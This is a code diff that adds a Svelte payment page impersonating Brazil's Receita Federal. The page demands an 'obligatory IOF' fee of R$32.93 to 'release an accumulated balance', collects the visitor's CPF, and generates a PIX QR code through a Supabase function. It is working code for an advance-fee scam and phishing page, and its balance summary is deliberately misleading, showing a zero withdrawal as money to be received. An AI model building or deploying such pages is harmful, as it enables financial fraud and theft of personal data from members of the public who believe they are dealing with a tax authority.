@@ -1,0 +1,209 @@
+<script lang="ts">
+  import Input from '$lib/components/Input.svelte';
+  import Checkbox from '$lib/components/Checkbox.svelte';
+  import { supabase } from '$lib/supabase';
+  import QRCode from 'qrcode';
+
+  let cpf = $state('');
+  let agreed = $state(false);
+  let isLoading = $state(false);
+  let qrCodeUrl = $state<string | null>(null);
+  let pixCode = $state<string | null>(null);
+  let transactionId = $state<string | null>(null);
+  let iofValue = $state(32.93);
+  let errorMessage = $state<string | null>(null);
+
+  function formatCPF(value: string): string {
+    const numbers = value.replace(/\D/g, '');
+    return numbers
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+      .slice(0, 14);
+  }
+
+  function handleCPFChange(value: string) {
+    cpf = formatCPF(value);
+  }
+
+  async function handlePayment() {
+    if (!cpf || !agreed) return;
+
+    isLoading = true;
+    errorMessage = null;
+
+    try {
+      const { data, error } = await supabase.functions.invoke('create-pix-payment', {
+        body: {
+          amount: Math.round(iofValue * 100),
+          customerCpf: cpf.replace(/\D/g, ''),
+          customerName: 'Cliente',
+          customerEmail: 'cliente@email.com',
+          customerPhone: '11999999999',
+        },
+      });
+
+      if (error) throw error;
+
+      if (data?.pix) {
+        qrCodeUrl = data.pix.qrcodeUrl;
+        pixCode = data.pix.qrcode;
+        transactionId = data.id;
+      }
+    } catch (error) {
+      console.error('Payment error:', error);
+      errorMessage = 'Erro ao processar pagamento. Tente novamente em alguns instantes.';
+    } finally {
+      isLoading = false;
+    }
+  }
+
+  async function copyPixCode() {
+    if (pixCode) {
+      try {
+        await navigator.clipboard.writeText(pixCode);
+        alert('Código copiado!');
+      } catch (err) {
+        console.error('Failed to copy:', err);
+      }
+    }
+  }
+</script>
+
+{#if qrCodeUrl && pixCode}
+  <div class="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
+    <header class="bg-blue-900 py-4 flex items-center justify-center gap-3">
+      <svg class="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+      </svg>
+      <span class="text-white font-semibold text-lg">Receita Federal</span>
+    </header>
+
+    <main class="flex-1 flex flex-col items-center px-4 py-6">
+      <div class="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
+        <h2 class="text-xl font-bold text-gray-900 text-center mb-4">
+          Pague via PIX
+        </h2>
+
+        <div class="flex justify-center mb-4 bg-white p-4 rounded-lg">
+          <img src={qrCodeUrl} alt="QR Code PIX" class="w-48 h-48" />
+        </div>
+
+        <p class="text-center text-gray-600 text-sm mb-4">
+          Escaneie o QR Code ou copie o código abaixo
+        </p>
+
+        <div class="bg-gray-100 p-3 rounded-lg mb-4">
+          <p class="text-xs text-gray-600 break-all font-mono">
+            {pixCode.slice(0, 50)}...
+          </p>
+        </div>
+
+        <button
+          onclick={copyPixCode}
+          class="w-full bg-teal-500 text-white py-3 rounded-lg font-semibold hover:bg-teal-600 transition-colors mb-4"
+        >
+          Copiar código PIX
+        </button>
+
+        <div class="text-center">
+          <p class="text-gray-500 text-sm">
+            Valor: <span class="font-semibold text-gray-900">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
+          </p>
+          <p class="text-gray-400 text-xs mt-2">
+            O pagamento será confirmado automaticamente
+          </p>
+        </div>
+      </div>
+    </main>
+  </div>
+{:else}
+  <div class="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
+    <header class="bg-blue-900 py-4 flex items-center justify-center gap-3">
+      <svg class="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+      </svg>
+      <span class="text-white font-semibold text-lg">Receita Federal</span>
+    </header>
+
+    <div class="mx-4 mt-4">
+      <div class="bg-orange-100 border-l-4 border-orange-500 p-4 rounded-r-lg flex items-center gap-3">
+        <svg class="w-6 h-6 text-orange-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
+        </svg>
+        <span class="text-orange-800 font-medium">Imposto sobre Operações Financeiras (IOF)</span>
+      </div>
+    </div>
+
+    <main class="flex-1 flex flex-col items-center px-4 py-6">
+      <div class="bg-white rounded-lg w-full max-w-lg shadow-lg">
+        <div class="p-6 border-b">
+          <h2 class="text-xl font-bold text-gray-900">
+            Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
+          </h2>
+        </div>
+
+        <div class="p-4 mx-4 mt-4 bg-gray-50 rounded-lg">
+          <h3 class="font-semibold text-gray-900 mb-4">Resumo</h3>
+          <div class="space-y-3">
+            <div class="flex justify-between">
+              <span class="text-gray-600">Valor de saque</span>
+              <span class="font-medium">R$ 0,00</span>
+            </div>
+            <div class="flex justify-between">
+              <span class="text-red-600">Valor a ser pago (IOF)</span>
+              <span class="text-red-600 font-medium">- R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
+            </div>
+            <div class="border-t pt-3 flex justify-between">
+              <span class="font-semibold text-gray-900">Total a receber no PIX</span>
+              <span class="font-bold text-gray-900">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="p-4 mx-4 mt-4 bg-white border border-gray-200 rounded-lg">
+          <label class="block text-sm font-medium text-gray-900 mb-2">
+            CPF do titular <span class="text-red-500">*</span>
+          </label>
+          <Input
+            placeholder="000.000.000-00"
+            bind:value={cpf}
+            oninput={handleCPFChange}
+            class="w-full"
+          />
+          <p class="text-xs text-red-500 mt-1">* Campo obrigatório para prosseguir</p>
+        </div>
+
+        {#if errorMessage}
+          <div class="p-4 mx-4 mt-4 bg-red-50 border border-red-200 rounded-lg">
+            <p class="text-sm text-red-800">{errorMessage}</p>
+          </div>
+        {/if}
+
+        <div class="p-4 mx-4">
+          <button
+            onclick={handlePayment}
+            disabled={!cpf || !agreed || isLoading}
+            class={`w-full py-4 rounded-lg font-semibold transition-colors ${
+              cpf && agreed && !isLoading
+                ? 'bg-gray-500 text-white hover:bg-gray-600'
+                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
+            }`}
+          >
+            {isLoading ? 'Processando...' : 'Pagar Imposto (IOF)'}
+          </button>
+        </div>
+
+        <div class="p-4 mx-4 mb-4 flex items-center gap-3">
+          <Checkbox
+            id="terms"
+            bind:checked={agreed}
+          />
+          <label for="terms" class="text-sm text-gray-600 cursor-pointer">
+            Concordo com os termos e condições <span class="text-red-500">*</span>
+          </label>
+        </div>
+      </div>
+    </main>
+  </div>
+{/if}
